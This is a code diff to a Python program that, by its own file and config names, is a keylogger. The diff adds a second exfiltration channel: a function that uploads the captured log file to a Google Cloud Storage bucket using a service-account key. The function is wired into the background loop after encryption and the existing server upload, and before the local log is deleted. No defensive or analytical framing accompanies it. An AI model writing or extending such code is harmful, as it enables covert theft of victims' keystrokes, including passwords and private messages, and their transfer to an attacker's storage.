@@ -10,6 +10,7 @@ from datetime import datetime
 from cryptography.fernet import Fernet
 import configparser
 import zlib
+from google.cloud import storage
 
 # Load configurations from an external config file
 config = configparser.ConfigParser()
@@ -17,6 +18,9 @@ config.read(os.path.expanduser("~/.keylogger_config.ini"))
 
 SERVER_URL = config.get("Server", "URL", fallback="https://your-server-url.com/upload")
 encryption_key = config.get("Encryption", "Key", fallback=Fernet.generate_key().decode()).encode()
+
+GCS_BUCKET_NAME = config.get("GoogleCloud", "BucketName", fallback="your_bucket_name")
+GCS_KEY_FILE = config.get("GoogleCloud", "KeyFile", fallback="path/to/your/service-account-key.json")
 
 # Log file details
 log_dir = os.path.expanduser("~/.keylogger_logs")
@@ -104,6 +108,23 @@ def send_logs_to_server():
     else:
         logging.error("Failed to send logs after multiple attempts.")
 
+# Function to send logs to Google Cloud Storage
+def send_logs_to_gcs():
+    try:
+        # Initialize the Google Cloud Storage client
+        client = storage.Client.from_service_account_json(GCS_KEY_FILE)
+        bucket = client.bucket(GCS_BUCKET_NAME)
+        blob = bucket.blob(os.path.basename(log_file))
+
+        # Upload the log file
+        blob.upload_from_filename(log_file)
+
+        logging.info("Logs uploaded to Google Cloud Storage successfully.")
+    except FileNotFoundError:
+        logging.error("Log file not found for GCS upload.")
+    except Exception as e:
+        logging.error(f"Error uploading logs to GCS: {e}")
+
 # Function to rotate internal logs
 def rotate_internal_logs():
     try:
@@ -130,6 +151,7 @@ def run_in_background():
         encrypt_logs()
         verify_log_integrity()
         send_logs_to_server()
+        send_logs_to_gcs()
 
         os.remove(log_file)
     except Exception as e:
